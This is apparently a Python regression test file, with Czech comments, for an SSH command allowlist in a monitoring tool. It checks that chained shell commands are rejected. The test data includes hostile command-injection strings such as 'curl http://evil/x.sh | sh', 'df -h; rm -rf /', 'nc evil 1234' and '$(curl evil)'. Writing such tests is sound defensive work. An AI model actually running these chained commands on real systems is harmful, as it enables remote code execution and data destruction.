"""Regrese: obcházení SSH allowlistu zřetězením příkazů.

Dvě protichůdné chyby, které se navzájem maskovaly:
  A) check_command_allowed() měl fallback `rule['pattern'] in command`
     → 'ss -tlnp && curl evil|sh' obsahuje 'ss -tlnp' a prošlo. Navíc glob
     'systemctl restart *' pohltil i '&& evil'.
  B) _pre_validate_ssh_command() četl klíč 'command', ale řádky mají 'pattern'
     → vracel False pro KAŽDÝ příkaz, takže legitimní SSH akce končily
     na [BLOCKED-244].
"""
import os
import sys
import unittest
from unittest.mock import patch

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from sentinel import actions
from sentinel import state_agents

# Pravidla odpovídají výchozímu allowlistu (vč. legitimních compound pravidel)
_RULES = [
    {"pattern": "df -h", "auto_execute": 0},
    {"pattern": "ss -tlnp", "auto_execute": 0},
    {"pattern": "mount -a", "auto_execute": 1},
    {"pattern": "systemctl restart *", "auto_execute": 0},
    {"pattern": "systemctl restart *.service", "auto_execute": 1},
    {"pattern": "journalctl --rotate && journalctl --vacuum-time=7d", "auto_execute": 0},
    {"pattern": "du -sh /var/* /home/* /tmp/* 2>/dev/null | sort -rh | head -20", "auto_execute": 0},
]


class TestAllowlistBypass(unittest.TestCase):
    def setUp(self):
        p = patch.object(state_agents, "list_allowed_commands", return_value=_RULES)
        p.start()
        self.addCleanup(p.stop)

    def test_chained_command_is_rejected(self):
        """Jádro díry: připojení příkazu přes shell metaznak nesmí projít."""
        for evil in [
            "ss -tlnp && curl http://evil/x.sh | sh",
            "systemctl restart x && evil",
            "df -h; rm -rf /",
            "systemctl restart x | nc evil 1234",
            "mount -a `id`",
            "systemctl restart x $(curl evil)",
            "systemctl restart x > /etc/passwd",
            "df -h & wget evil",
        ]:
            self.assertIsNone(state_agents.check_command_allowed(evil),
                              f"allowlist propustil útok: {evil!r}")

    def test_substring_alone_is_not_enough(self):
        """Pouhý výskyt povoleného vzoru v delším příkazu nestačí."""
        self.assertIsNone(state_agents.check_command_allowed("echo df -h"))
        self.assertIsNone(state_agents.check_command_allowed("sudo mount -a --fake"))

    def test_legitimate_commands_still_allowed(self):
        for ok in ["df -h", "mount -a", "systemctl restart nginx.service",
                   "systemctl restart my-app"]:
            self.assertIsNotNone(state_agents.check_command_allowed(ok),
                                 f"legitimní příkaz zablokován: {ok!r}")

    def test_legitimate_compound_rules_still_allowed(self):
        """Pravidla, která metaznaky obsahují záměrně, musí fungovat dál."""
        for ok in ["journalctl --rotate && journalctl --vacuum-time=7d",
                   "du -sh /var/* /home/* /tmp/* 2>/dev/null | sort -rh | head -20"]:
            self.assertIsNotNone(state_agents.check_command_allowed(ok),
                                 f"compound pravidlo zablokováno: {ok!r}")

    def test_empty_command_rejected(self):
        self.assertIsNone(state_agents.check_command_allowed(""))
        self.assertIsNone(state_agents.check_command_allowed(None))


class TestPreValidateLayer(unittest.TestCase):
    """Vrstva 2 (actions._pre_validate_ssh_command) musí souhlasit s vrstvou 1."""

    def setUp(self):
        for target in (state_agents, actions.state):
            p = patch.object(target, "list_allowed_commands", return_value=_RULES)
            p.start()
            self.addCleanup(p.stop)

    def test_legit_commands_not_blocked(self):
        """Regrese B: dřív vracelo False pro všechno → [BLOCKED-244]."""
        for ok in ["df -h", "mount -a", "systemctl restart nginx.service"]:
            self.assertTrue(actions._pre_validate_ssh_command(ok),
                            f"legitimní příkaz blokován vrstvou 2: {ok!r}")

    def test_chained_command_blocked(self):
        self.assertFalse(actions._pre_validate_ssh_command("ss -tlnp && curl evil|sh"))

    def test_empty_allowlist_is_fail_open(self):
        """Zdokumentované chování: prázdný allowlist = bez omezení."""
        with patch.object(actions.state, "list_allowed_commands", return_value=[]):
            self.assertTrue(actions._pre_validate_ssh_command("cokoliv"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
